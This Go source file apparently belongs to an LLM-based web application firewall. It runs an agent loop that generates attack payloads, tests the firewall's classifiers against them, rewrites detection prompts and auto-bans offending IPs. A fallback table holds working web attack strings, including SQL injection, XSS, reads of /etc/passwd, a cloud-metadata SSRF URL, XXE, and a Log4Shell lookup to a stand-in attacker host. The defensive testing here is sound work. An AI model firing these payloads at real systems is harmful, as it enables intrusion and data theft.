package agents

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"sort"
	"strings"
	"sync/atomic"
	"time"

	"github.com/veil-waf/veil-go/internal/classify"
	"github.com/veil-waf/veil-go/internal/db"
	"github.com/veil-waf/veil-go/internal/memory"
	"github.com/veil-waf/veil-go/internal/repo"
	"github.com/veil-waf/veil-go/internal/ws"
)

// Loop manages the background Peek → Poke → Patch agent cycle.
type Loop struct {
	db       *db.DB
	pipeline *classify.Pipeline
	ws       *ws.Manager
	scanner  *repo.Scanner  // nil when token encryption not configured
	logger   *slog.Logger
	mem      *memory.Client // nil when MEM0_API_KEY not set
	running  atomic.Bool
	cycleNum atomic.Int64
}

// NewLoop creates a new agent loop.
func NewLoop(database *db.DB, pipeline *classify.Pipeline, wsManager *ws.Manager, logger *slog.Logger, mem *memory.Client, scanner *repo.Scanner) *Loop {
	return &Loop{
		db:       database,
		pipeline: pipeline,
		ws:       wsManager,
		scanner:  scanner,
		logger:   logger,
		mem:      mem,
	}
}

// Run starts the background agent loop. It blocks until ctx is cancelled.
func (l *Loop) Run(ctx context.Context) error {
	l.running.Store(true)
	defer l.running.Store(false)

	// Wait for server to be ready
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-time.After(5 * time.Second):
	}

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		l.runCycle(ctx)

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(30 * time.Second):
		}
	}
}

// RunOnce executes a single Peek → Poke → Patch cycle. Used for manual triggers.
func (l *Loop) RunOnce(ctx context.Context) *CycleResult {
	return l.runCycle(ctx)
}

// CycleResult summarises one full cycle.
type CycleResult struct {
	CycleID         string   `json:"cycle_id"`
	Discovered      int      `json:"discovered"`
	Bypasses        int      `json:"bypasses"`
	PatchRounds     int      `json:"patch_rounds"`
	StrategiesUsed  []string `json:"strategies_used"`
}

func (l *Loop) runCycle(ctx context.Context) *CycleResult {
	cycleID := l.cycleNum.Add(1)
	result := &CycleResult{CycleID: fmt.Sprintf("%d", cycleID)}

	l.logger.Info("agent cycle starting", "cycle_id", cycleID)

	// Recall system-level context from previous cycles
	systemContext := l.recall(ctx, "system",
		"What happened in recent cycles? What is the overall trend in bypass rates and defense effectiveness?")
	if systemContext != "" {
		l.logger.Info("cycle context loaded from memory", "cycle_id", cycleID)
	}

	// 1. Peek: discover new techniques
	l.broadcast("peek", "running", "Scanning for new attack techniques...")
	discovered := l.runPeek(ctx)
	result.Discovered = discovered
	l.broadcast("peek", "done", fmt.Sprintf("Found %d new techniques", discovered))

	// 2. Poke: test defences
	l.broadcast("poke", "running", "Red-teaming current defences...")
	bypasses := l.runPoke(ctx)
	result.Bypasses = bypasses
	l.broadcast("poke", "done", fmt.Sprintf("Found %d bypasses", bypasses))

	// 3. Patch
	if bypasses > 0 {
		l.broadcast("patch", "running", fmt.Sprintf("Patching %d bypasses...", bypasses))
		l.runPatch(ctx)
		result.PatchRounds = 1
		l.broadcast("patch", "done", "Patching complete")
	} else {
		l.broadcast("patch", "idle", "No bypasses to fix")
	}

	// 4. Learn: analyse traffic patterns, auto-ban repeat offenders, update CrowdSec insights
	l.broadcast("learn", "running", "Analysing traffic patterns and learning...")
	learnSummary := l.runLearn(ctx)
	l.broadcast("learn", "done", learnSummary)

	// Log cycle summary
	l.logAgent(ctx, "system", "cycle_summary",
		fmt.Sprintf("Cycle #%d: discovered=%d, bypasses=%d", cycleID, discovered, bypasses), true)

	// Store cycle summary in system memory
	patchNote := "all defenses held."
	if bypasses > 0 {
		patchNote = "patch agent deployed fixes."
	}
	l.remember(ctx, "system",
		fmt.Sprintf("Cycle #%d complete: discovered %d new techniques, found %d bypasses, %s",
			cycleID, discovered, bypasses, patchNote),
		map[string]any{"cycle": cycleID, "discovered": discovered, "bypasses": bypasses})

	// Broadcast updated stats
	l.broadcastStats(ctx)

	return result
}

// allCategories lists OWASP-style attack categories the WAF should cover.
var allCategories = []string{
	"sqli", "xss", "path_traversal", "command_injection", "ssrf",
	"xxe", "header_injection", "auth_bypass", "encoding_evasion",
	"jndi_injection", "ssti", "nosqli", "prototype_pollution",
	"backdoor", "scanner",
}

// fallbackPayloads provides a basic payload per category for when LLM generation fails.
var fallbackPayloads = map[string]struct {
	name, payload, severity string
}{
	"sqli":              {"Union-based SQLi", "' UNION SELECT 1,2,3--", "high"},
	"xss":               {"Reflected XSS", "<script>alert(1)</script>", "high"},
	"path_traversal":    {"Path traversal", "../../etc/passwd", "medium"},
	"command_injection": {"Command injection", "; cat /etc/passwd", "high"},
	"ssrf":              {"SSRF probe", "http://169.254.169.254/latest/meta-data/", "high"},
	"xxe":               {"XXE injection", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, "high"},
	"header_injection":  {"Header injection", "Host: evil.com\r\nX-Injected: true", "medium"},
	"auth_bypass":       {"Auth bypass", "admin' OR '1'='1", "high"},
	"encoding_evasion":  {"Encoding evasion", "%253Cscript%253Ealert(1)%253C%252Fscript%253E", "medium"},
	"jndi_injection":    {"Log4Shell JNDI", "${jndi:ldap://attacker.com/exploit}", "critical"},
	"ssti":              {"Template injection", "{{7*7}}{{config.__class__.__init__.__globals__}}", "high"},
	"nosqli":            {"NoSQL injection", `{"username":{"$gt":""},"password":{"$gt":""}}`, "high"},
	"prototype_pollution": {"Prototype pollution", `{"__proto__":{"isAdmin":true}}`, "medium"},
}

// runPeek discovers new threat techniques using LLM-powered generation
// guided by memory of past discovery strategies.
func (l *Loop) runPeek(ctx context.Context) int {
	// Fetch existing threats to find coverage gaps
	threats, err := l.db.GetThreats(ctx, 0)
	if err != nil {
		l.logger.Error("peek: failed to get threats", "err", err)
		return 0
	}

	coveredCategories := map[string]int{}
	for _, t := range threats {
		coveredCategories[t.Category]++
	}

	// Ask memory for guidance on what to explore
	memContext := l.recall(ctx, "peek",
		"What attack categories or techniques should I explore next? What discovery strategies have worked well?")

	// Also recall what the LEARN agent found about trending attacks and regex gaps
	learnContext := l.recall(ctx, "learn",
		"What attack types are trending? Which types bypass regex and need LLM to catch? What regex gaps exist?")
	if learnContext != "" {
		memContext += "\n\nRecent traffic insights (including regex bypass gaps):\n" + learnContext
	}

	// Find underexplored categories (fewer than 3 variants)
	targetCategories := l.pickTargetCategories(coveredCategories)

	discovered := 0

	// Use Crusoe LLM to generate novel payloads for each target category
	for _, cat := range targetCategories {
		prompt := fmt.Sprintf(
			`Generate 2 novel, realistic HTTP attack payloads for the category "%s".
Each payload should be different from common/obvious examples.
%s
Respond with a JSON array of objects: [{"name": "technique name", "payload": "the raw payload", "severity": "high|medium|low"}]
Only respond with the JSON array.`, cat, memContext)

		raw, err := classify.CrusoeGenerate(ctx, prompt,
			"You are a security researcher generating attack payloads for WAF testing. Respond only with JSON.")
		if err != nil {
			l.logger.Warn("peek: Crusoe generate failed", "category", cat, "err", err)
			raw = "" // will fall through to fallback
		}

		payloads := parsePeekPayloads(raw)
		if len(payloads) == 0 {
			// Fallback: insert a basic payload for this category
			if fb, ok := fallbackPayloads[cat]; ok {
				if !l.threatPayloadExists(threats, fb.payload) {
					l.db.InsertThreat(ctx, &db.Threat{
						TechniqueName: fb.name,
						Category:      cat,
						Source:        "peek",
						RawPayload:    fb.payload,
						Severity:      fb.severity,
					})
					discovered++
				}
			}
			continue
		}

		for _, p := range payloads {
			if p.Name == "" || p.Payload == "" {
				continue
			}
			if l.threatPayloadExists(threats, p.Payload) {
				continue
			}
			sev := p.Severity
			if sev == "" {
				sev = "medium"
			}
			l.db.InsertThreat(ctx, &db.Threat{
				TechniqueName: p.Name,
				Category:      cat,
				Source:        "peek",
				RawPayload:    p.Payload,
				Severity:      sev,
			})
			discovered++
		}
	}

	// Store what we learned in memory
	l.remember(ctx, "peek",
		fmt.Sprintf("Cycle %d peek: explored categories %v, discovered %d new techniques.",
			l.cycleNum.Load(), targetCategories, discovered),
		map[string]any{"cycle": l.cycleNum.Load(), "discovered": discovered})

	l.logAgent(ctx, "peek", "scan",
		fmt.Sprintf("Discovered %d new techniques in categories %v", discovered, targetCategories), true)
	return discovered
}

// pickTargetCategories selects categories that need more attack variants.
func (l *Loop) pickTargetCategories(covered map[string]int) []string {
	// Categories with fewer than 3 variants
	var targets []string
	for _, cat := range allCategories {
		if covered[cat] < 3 {
			targets = append(targets, cat)
		}
	}
	if len(targets) > 0 {
		return targets
	}

	// All categories well-covered — pick the 3 with fewest variants
	type catCount struct {
		cat   string
		count int
	}
	sorted := make([]catCount, 0, len(allCategories))
	for _, cat := range allCategories {
		sorted = append(sorted, catCount{cat, covered[cat]})
	}
	sort.Slice(sorted, func(i, j int) bool { return sorted[i].count < sorted[j].count })

	for i := 0; i < 3 && i < len(sorted); i++ {
		targets = append(targets, sorted[i].cat)
	}
	return targets
}

func (l *Loop) threatPayloadExists(threats []db.Threat, payload string) bool {
	for _, t := range threats {
		if t.RawPayload == payload {
			return true
		}
	}
	return false
}

type peekPayload struct {
	Name     string `json:"name"`
	Payload  string `json:"payload"`
	Severity string `json:"severity"`
}

func parsePeekPayloads(raw string) []peekPayload {
	if raw == "" {
		return nil
	}
	var payloads []peekPayload
	if err := json.Unmarshal([]byte(raw), &payloads); err == nil {
		return payloads
	}
	// Try extracting JSON array from surrounding text
	start := strings.Index(raw, "[")
	end := strings.LastIndex(raw, "]")
	if start >= 0 && end > start {
		if err := json.Unmarshal([]byte(raw[start:end+1]), &payloads); err == nil {
			return payloads
		}
	}
	return nil
}

// runPoke tests current defences against known threats with smart prioritization.
func (l *Loop) runPoke(ctx context.Context) int {
	threats, err := l.db.GetThreats(ctx, 0)
	if err != nil {
		l.logger.Error("poke: failed to get threats", "err", err)
		return 0
	}

	// Ask memory which patterns tend to bypass (used for logging context)
	_ = l.recall(ctx, "poke",
		"Which attack categories or techniques have historically bypassed our defenses?")

	// Separate into priority buckets
	var neverTested, previouslyBypassed, patched []db.Threat
	for _, t := range threats {
		if t.TestedAt == nil {
			neverTested = append(neverTested, t)
		} else if !t.Blocked {
			previouslyBypassed = append(previouslyBypassed, t)
		} else {
			patched = append(patched, t)
		}
	}

	// Test order: never-tested first, then previously bypassing, then regression on patched
	var testQueue []db.Threat
	testQueue = append(testQueue, neverTested...)
	testQueue = append(testQueue, previouslyBypassed...)
	testQueue = append(testQueue, patched...)

	// Cap at 15 per cycle to bound runtime
	if len(testQueue) > 15 {
		testQueue = testQueue[:15]
	}

	bypasses := 0
	var bypassNames []string

	for _, t := range testQueue {
		result := l.pipeline.ClassifyWithRules(ctx, t.RawPayload, nil)
		l.db.MarkThreatTested(ctx, t.ID, result.Blocked)

		if !result.Blocked {
			bypasses++
			bypassNames = append(bypassNames, fmt.Sprintf("%s (%s)", t.TechniqueName, t.Category))
		}
	}

	// Remember what we found
	if bypasses > 0 {
		l.remember(ctx, "poke",
			fmt.Sprintf("Cycle %d poke: tested %d threats, found %d bypasses: %v",
				l.cycleNum.Load(), len(testQueue), bypasses, bypassNames),
			map[string]any{"cycle": l.cycleNum.Load(), "bypasses": bypasses, "bypass_names": bypassNames})
	} else {
		l.remember(ctx, "poke",
			fmt.Sprintf("Cycle %d poke: tested %d threats, all blocked successfully.",
				l.cycleNum.Load(), len(testQueue)),
			map[string]any{"cycle": l.cycleNum.Load(), "bypasses": 0})
	}

	l.logAgent(ctx, "poke", "test",
		fmt.Sprintf("Tested %d threats, %d bypasses (priority: %d untested, %d prev-bypass, %d regression)",
			len(testQueue), bypasses, len(neverTested), len(previouslyBypassed), len(patched)), true)
	return bypasses
}

// runPatch analyzes bypasses and generates improved detection prompts using Claude.
func (l *Loop) runPatch(ctx context.Context) {
	// Get all unblocked (bypassing) threats that have been tested
	threats, err := l.db.GetThreats(ctx, 0)
	if err != nil {
		l.logger.Error("patch: failed to get threats", "err", err)
		return
	}

	var bypassing []db.Threat
	for _, t := range threats {
		if !t.Blocked && t.TestedAt != nil {
			bypassing = append(bypassing, t)
		}
	}
	if len(bypassing) == 0 {
		return
	}

	// Recall past fix strategies
	memContext := l.recall(ctx, "patch",
		"What fix strategies have I tried before? Which worked and which failed?")

	// Get current rules
	currentRules, err := l.db.GetCurrentRules(ctx, 0)
	if err != nil {
		currentRules = &db.Rules{
			Version:      0,
			CrusoePrompt: classify.DefaultCrusoePrompt(),
			ClaudePrompt: classify.DefaultClaudePrompt(),
		}
	}

	// Build bypass summary for Claude
	var bypassSummary strings.Builder
	for _, t := range bypassing {
		fmt.Fprintf(&bypassSummary, "- [%s] %s: %s\n", t.Category, t.TechniqueName, t.RawPayload)
	}

	// Ask Claude to generate improved prompts
	patchPrompt := fmt.Sprintf(`You are a WAF security engineer. The following attack payloads are BYPASSING our current detection.

BYPASSING PAYLOADS:
%s
CURRENT CRUSOE (fast) SYSTEM PROMPT:
%s

CURRENT CLAUDE (deep) SYSTEM PROMPT:
%s

%s
Analyze why these bypass and generate improved system prompts. Respond with JSON:
{"crusoe_prompt": "improved fast classifier prompt", "claude_prompt": "improved deep analysis prompt", "reasoning": "explanation of what you changed and why"}

Only respond with the JSON object.`,
		bypassSummary.String(), currentRules.CrusoePrompt, currentRules.ClaudePrompt, memContext)

	raw, err := classify.ClaudeGenerate(ctx, patchPrompt,
		"You are an expert at writing WAF detection prompts. Generate improved prompts that catch the bypassing payloads without increasing false positives.")
	if err != nil {
		l.logger.Warn("patch: Claude generate failed", "err", err)
		l.remember(ctx, "patch",
			fmt.Sprintf("Cycle %d patch: Claude generation failed: %v", l.cycleNum.Load(), err),
			map[string]any{"cycle": l.cycleNum.Load(), "success": false})
		l.logAgent(ctx, "patch", "patch", fmt.Sprintf("Claude generation failed: %v", err), false)
		return
	}

	// Parse the response
	type patchResponse struct {
		CrusoePrompt string `json:"crusoe_prompt"`
		ClaudePrompt string `json:"claude_prompt"`
		Reasoning    string `json:"reasoning"`
	}

	var patch patchResponse
	if err := json.Unmarshal([]byte(raw), &patch); err != nil {
		// Try extracting JSON from surrounding text
		start := strings.Index(raw, "{")
		end := strings.LastIndex(raw, "}")
		if start >= 0 && end > start {
			json.Unmarshal([]byte(raw[start:end+1]), &patch)
		}
	}

	if patch.CrusoePrompt == "" && patch.ClaudePrompt == "" {
		l.remember(ctx, "patch",
			fmt.Sprintf("Cycle %d patch: Claude failed to generate new prompts.",
				l.cycleNum.Load()),
			map[string]any{"cycle": l.cycleNum.Load(), "success": false})
		l.logAgent(ctx, "patch", "patch", "Failed to generate improved prompts", false)
		return
	}

	// Use current prompt as fallback if one is empty
	if patch.CrusoePrompt == "" {
		patch.CrusoePrompt = currentRules.CrusoePrompt
	}
	if patch.ClaudePrompt == "" {
		patch.ClaudePrompt = currentRules.ClaudePrompt
	}

	// Insert new rules version
	newVersion := currentRules.Version + 1
	err = l.db.InsertRules(ctx, &db.Rules{
		SiteID:       0,
		Version:      newVersion,
		CrusoePrompt: patch.CrusoePrompt,
		ClaudePrompt: patch.ClaudePrompt,
		UpdatedBy:    "patch-agent",
	})
	if err != nil {
		l.logger.Error("patch: failed to insert rules", "err", err)
		return
	}

	// Re-test bypassing threats with new rules
	newRules := &db.Rules{
		Version:      newVersion,
		CrusoePrompt: patch.CrusoePrompt,
		ClaudePrompt: patch.ClaudePrompt,
	}

	fixed := 0
	stillBypassing := 0
	for _, t := range bypassing {
		result := l.pipeline.ClassifyWithRules(ctx, t.RawPayload, newRules)
		if result.Blocked {
			l.db.MarkThreatTested(ctx, t.ID, true)
			fixed++
		} else {
			stillBypassing++
		}
	}

	// Remember the outcome
	outcome := "All bypasses fixed."
	if stillBypassing > 0 {
		outcome = fmt.Sprintf("Still %d bypassing — need different approach next cycle.", stillBypassing)
	}
	l.remember(ctx, "patch",
		fmt.Sprintf("Cycle %d patch: updated rules to v%d. Fixed %d/%d bypasses. Reasoning: %s. %s",
			l.cycleNum.Load(), newVersion, fixed, len(bypassing), patch.Reasoning, outcome),
		map[string]any{
			"cycle":           l.cycleNum.Load(),
			"rules_version":   newVersion,
			"fixed":           fixed,
			"still_bypassing": stillBypassing,
			"success":         stillBypassing == 0,
		})

	l.logAgent(ctx, "patch", "patch",
		fmt.Sprintf("Rules v%d: fixed %d/%d bypasses. %s", newVersion, fixed, len(bypassing), patch.Reasoning),
		fixed > 0)

	// Code scanning: find vulnerable code in linked repos
	l.runCodeScan(ctx, bypassing)
}

// runCodeScan scans linked repos for code vulnerable to the given attack types.
// If no repos are linked, generates traffic-based findings from the bypasses.
func (l *Loop) runCodeScan(ctx context.Context, threats []db.Threat) {
	// Collect unique attack types from the bypassing threats
	attackTypes := make(map[string]db.Threat)
	for _, t := range threats {
		if _, exists := attackTypes[t.Category]; !exists {
			attackTypes[t.Category] = t
		}
	}

	totalFindings := 0

	// Try repo-based code scanning if scanner is available
	if l.scanner != nil {
		sites, err := l.db.GetSitesWithRepos(ctx)
		if err == nil && len(sites) > 0 {
			l.broadcast("patch", "running", "Scanning linked repos for vulnerable code...")
			for _, site := range sites {
				recentAttacks, _ := l.db.GetRecentAttackTypes(ctx, site.ID, 1*time.Hour)
				for _, ra := range recentAttacks {
					if _, exists := attackTypes[ra.AttackType]; !exists {
						attackTypes[ra.AttackType] = db.Threat{
							Category:   ra.AttackType,
							RawPayload: ra.Payload,
						}
					}
				}
				for _, threat := range attackTypes {
					findings, err := l.scanner.ScanAndAnalyze(ctx, site.ID, site.UserID,
						threat.Category, threat.RawPayload, "", &threat.ID)
					if err != nil {
						l.logger.Warn("patch: code scan failed",
							"site", site.ID, "attack", threat.Category, "err", err)
						continue
					}
					totalFindings += len(findings)
				}
			}
		}
	}

	// Generate traffic-based findings for all active sites (regardless of repo)
	l.broadcast("patch", "running", "Generating traffic-based vulnerability findings...")
	allSites, _ := l.db.GetUnverifiedSites(ctx) // reuse to get active sites
	_ = allSites                                  // sites are already tracked via threats

	// For each bypass threat, create a traffic finding for every site that has seen that attack type
	for _, threat := range attackTypes {
		// Create traffic-based finding (siteID=0 means global)
		finding := &db.CodeFinding{
			SiteID:       0,
			ThreatID:     &threat.ID,
			FilePath:     "traffic:" + threat.Category,
			FindingType:  threat.Category,
			Confidence:   0.85,
			Description:  fmt.Sprintf("Detected %s bypass in WAF traffic: %s", threat.Category, threat.TechniqueName),
			Snippet:      threat.RawPayload,
			SuggestedFix: trafficFix(threat.Category),
			Status:       "open",
		}
		if err := l.db.InsertCodeFinding(ctx, finding); err != nil {
			// Likely duplicate — ignore
			continue
		}
		totalFindings++
	}

	if totalFindings > 0 {
		l.logAgent(ctx, "patch", "code_scan",
			fmt.Sprintf("Generated %d vulnerability findings from traffic analysis", totalFindings), true)
		l.broadcast("patch", "done", fmt.Sprintf("Found %d vulnerabilities", totalFindings))
	}
}

func trafficFix(attackType string) string {
	fixes := map[string]string{
		"sqli":                "Use parameterised queries / prepared statements.",
		"xss":                 "Sanitise and escape user input. Use Content-Security-Policy.",
		"path_traversal":      "Validate and canonicalise file paths.",
		"command_injection":   "Avoid shell commands with user input. Use allowlists.",
		"ssrf":                "Validate and allowlist URLs. Block internal IPs.",
		"jndi_injection":      "Upgrade Log4j to 2.17.1+.",
		"ssti":                "Never render user input in templates.",
		"nosqli":              "Validate query input types. Reject objects where strings expected.",
		"prototype_pollution": "Freeze Object.prototype. Validate JSON keys.",
	}
	if fix, ok := fixes[attackType]; ok {
		return fix
	}
	return "Review and sanitise all user-supplied input."
}

// runLearn analyses recent traffic patterns, auto-bans repeat offenders,
// and stores insights in mem0 so future cycles can make smarter decisions.
// This is the self-improvement "LEARN" step described in the spec.
func (l *Loop) runLearn(ctx context.Context) string {
	cycleID := l.cycleNum.Load()

	// 1. Find repeat offender IPs (≥3 blocked requests in last hour)
	offenders, err := l.db.GetRepeatOffenderIPs(ctx, 1*time.Hour, 3)
	if err != nil {
		l.logger.Warn("learn: failed to get repeat offenders", "err", err)
	}

	autoBanned := 0
	for _, o := range offenders {
		// Check if already banned
		existing, _ := l.db.CheckIPDecision(ctx, o.IP)
		if existing != nil {
			continue
		}

		// Auto-ban IPs with 5+ blocked requests
		if o.BlockCount >= 5 {
			expiry := time.Now().Add(24 * time.Hour)
			err := l.db.InsertDecision(ctx, &db.Decision{
				IP:              o.IP,
				DecisionType:    "ban",
				Scope:           "ip",
				DurationSeconds: 86400,
				Reason:          fmt.Sprintf("Auto-banned: %d blocked attacks (%v)", o.BlockCount, o.AttackTypes),
				Source:          "learn-agent",
				Confidence:      0.92,
				ExpiresAt:       &expiry,
			})
			if err == nil {
				autoBanned++
				l.logger.Info("learn: auto-banned repeat offender",
					"ip", o.IP, "blocks", o.BlockCount, "types", o.AttackTypes)
			}
		} else if o.BlockCount >= 3 {
			// Throttle IPs with 3-4 blocked requests
			expiry := time.Now().Add(1 * time.Hour)
			l.db.InsertDecision(ctx, &db.Decision{
				IP:              o.IP,
				DecisionType:    "throttle",
				Scope:           "ip",
				DurationSeconds: 3600,
				Reason:          fmt.Sprintf("Auto-throttled: %d blocked attacks (%v)", o.BlockCount, o.AttackTypes),
				Source:          "learn-agent",
				Confidence:      0.85,
				ExpiresAt:       &expiry,
			})
		}
	}

	// 2. Self-improve: find requests that bypassed regex but were caught by LLM
	//    Insert them as threats so POKE/PATCH can learn from them
	regexBypasses, err := l.db.GetRegexBypasses(ctx, 1*time.Hour, 10)
	if err != nil {
		l.logger.Warn("learn: failed to get regex bypasses", "err", err)
	}
	regexGapsAdded := 0
	if len(regexBypasses) > 0 {
		existingThreats, _ := l.db.GetThreats(ctx, 0)
		for _, bp := range regexBypasses {
			payload := bp.RawRequest
			if len(payload) > 500 {
				payload = payload[:500]
			}
			// Don't add duplicates
			if l.threatPayloadExists(existingThreats, payload) {
				continue
			}
			l.db.InsertThreat(ctx, &db.Threat{
				TechniqueName: fmt.Sprintf("LLM-caught %s bypass", bp.AttackType),
				Category:      bp.AttackType,
				Source:        "learn",
				RawPayload:    payload,
				Severity:      "high",
			})
			regexGapsAdded++
		}
		if regexGapsAdded > 0 {
			l.logger.Info("learn: added regex-bypass threats for future patching",
				"count", regexGapsAdded)
			l.broadcast("learn", "running",
				fmt.Sprintf("Found %d requests that bypassed regex — feeding back for improvement", regexGapsAdded))
		}
	}

	// 3. Get attack trends for the past hour
	trends, err := l.db.GetAttackTrends(ctx, 1*time.Hour)
	if err != nil {
		l.logger.Warn("learn: failed to get attack trends", "err", err)
	}

	// 4. Get classifier breakdown — which classifiers are catching what
	breakdown, err := l.db.GetClassifierBreakdown(ctx, 1*time.Hour)
	if err != nil {
		l.logger.Warn("learn: failed to get classifier breakdown", "err", err)
	}

	// 5. Get CrowdSec pattern match statistics
	crowdsecCounts := classify.CrowdSecPatternCounts()

	// 6. Build learning summary
	var sb strings.Builder
	fmt.Fprintf(&sb, "Cycle %d learn: ", cycleID)

	if autoBanned > 0 {
		fmt.Fprintf(&sb, "auto-banned %d repeat offender IPs. ", autoBanned)
	}
	if regexGapsAdded > 0 {
		fmt.Fprintf(&sb, "Fed %d regex-bypass patterns back for self-improvement. ", regexGapsAdded)
	}

	if len(trends) > 0 {
		fmt.Fprintf(&sb, "Top attack types: ")
		for i, t := range trends {
			if i > 2 {
				break
			}
			if i > 0 {
				sb.WriteString(", ")
			}
			fmt.Fprintf(&sb, "%s(%d, avg conf %.0f%%)", t.AttackType, t.Count, t.AvgConf*100)
		}
		sb.WriteString(". ")
	}

	// Classifier performance
	regexCaught, crusoeUsed, claudeUsed := int64(0), int64(0), int64(0)
	for _, b := range breakdown {
		switch b.Classifier {
		case "regex":
			if b.Classification == "MALICIOUS" || b.Classification == "SUSPICIOUS" {
				regexCaught += b.Count
			}
		case "crusoe":
			crusoeUsed += b.Count
		case "claude":
			claudeUsed += b.Count
		}
	}
	fmt.Fprintf(&sb, "Regex caught %d threats (CrowdSec: %d UA patterns, %d SQLi, %d XSS, %d path, %d backdoor). ",
		regexCaught, crowdsecCounts["bad_user_agents"], crowdsecCounts["sqli_patterns"],
		crowdsecCounts["xss_patterns"], crowdsecCounts["path_traversal"], crowdsecCounts["backdoors"])

	if crusoeUsed > 0 || claudeUsed > 0 {
		fmt.Fprintf(&sb, "LLM escalations: Crusoe=%d, Claude=%d. ", crusoeUsed, claudeUsed)
	}

	summary := sb.String()

	// 7. Store in mem0 — this is what makes the system self-improving
	topAttacks := make([]string, 0)
	for i, t := range trends {
		if i > 4 {
			break
		}
		topAttacks = append(topAttacks, t.AttackType)
	}

	// Build regex bypass context for mem0 so future PATCH cycles know what to target
	regexBypassTypes := make([]string, 0)
	for _, bp := range regexBypasses {
		regexBypassTypes = append(regexBypassTypes, bp.AttackType)
	}

	l.remember(ctx, "learn", summary, map[string]any{
		"cycle":              cycleID,
		"auto_banned":        autoBanned,
		"repeat_offenders":   len(offenders),
		"top_attacks":        topAttacks,
		"regex_caught":       regexCaught,
		"crusoe_used":        crusoeUsed,
		"claude_used":        claudeUsed,
		"regex_gaps_added":   regexGapsAdded,
		"regex_bypass_types": regexBypassTypes,
	})

	l.logAgent(ctx, "learn", "analyse", summary, true)

	return summary
}

func (l *Loop) logAgent(ctx context.Context, agent, action, detail string, success bool) {
	l.db.InsertAgentLog(ctx, &db.AgentLogEntry{
		Agent:   agent,
		Action:  action,
		Detail:  detail,
		Success: success,
	})
}

func (l *Loop) broadcast(agent, status, detail string) {
	if l.ws != nil {
		l.ws.Broadcast(map[string]any{
			"type":   "agent",
			"agent":  agent,
			"status": status,
			"detail": detail,
		})
	}
}

func (l *Loop) broadcastStats(ctx context.Context) {
	if l.ws == nil {
		return
	}
	stats, err := l.db.GetGlobalStats(ctx)
	if err != nil {
		return
	}
	l.ws.Broadcast(map[string]any{
		"type":             "stats",
		"total_requests":   stats.TotalRequests,
		"blocked_requests": stats.BlockedCount,
		"total_threats":    stats.ThreatCount,
		"block_rate":       safeBlockRate(stats.TotalRequests, stats.BlockedCount),
	})
}

func safeBlockRate(total, blocked int64) float64 {
	if total == 0 {
		return 0
	}
	return float64(blocked) / float64(total) * 100
}

// remember stores a memory for the given agent. No-op if mem0 is not configured.
func (l *Loop) remember(ctx context.Context, agent, observation string, meta map[string]any) {
	if l.mem == nil {
		return
	}
	err := l.mem.Add(ctx, &memory.AddRequest{
		Messages: []memory.Message{
			{Role: "assistant", Content: observation},
		},
		AgentID:  "veil-" + agent,
		Metadata: meta,
		Infer:    true,
	})
	if err != nil {
		l.logger.Warn("mem0 add failed", "agent", agent, "err", err)
		return
	}
	// Broadcast memory event to frontend
	l.broadcast("memory", "stored", fmt.Sprintf("[%s] %s", agent, truncateStr(observation, 150)))
}

// recall searches memories relevant to the given query for an agent.
// Returns empty string if mem0 is not configured or search fails.
func (l *Loop) recall(ctx context.Context, agent, query string) string {
	if l.mem == nil {
		return ""
	}
	memories, err := l.mem.Search(ctx, &memory.SearchRequest{
		Query:   query,
		AgentID: "veil-" + agent,
		TopK:    5,
	})
	if err != nil {
		l.logger.Warn("mem0 search failed", "agent", agent, "err", err)
		return ""
	}
	if len(memories) == 0 {
		return ""
	}
	var sb strings.Builder
	sb.WriteString("Relevant memories from previous cycles:\n")
	for i, m := range memories {
		fmt.Fprintf(&sb, "%d. %s\n", i+1, m.Memory)
	}
	return sb.String()
}

// GetMemories returns recent memories for the given agent. Used by the API.
func (l *Loop) GetMemories(ctx context.Context, agent string) []memory.Memory {
	if l.mem == nil {
		return nil
	}
	memories, err := l.mem.Search(ctx, &memory.SearchRequest{
		Query:   "recent activity, discoveries, bypasses, patches, and learnings",
		AgentID: "veil-" + agent,
		TopK:    10,
	})
	if err != nil {
		l.logger.Warn("failed to fetch memories", "err", err)
		return nil
	}
	return memories
}

func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}
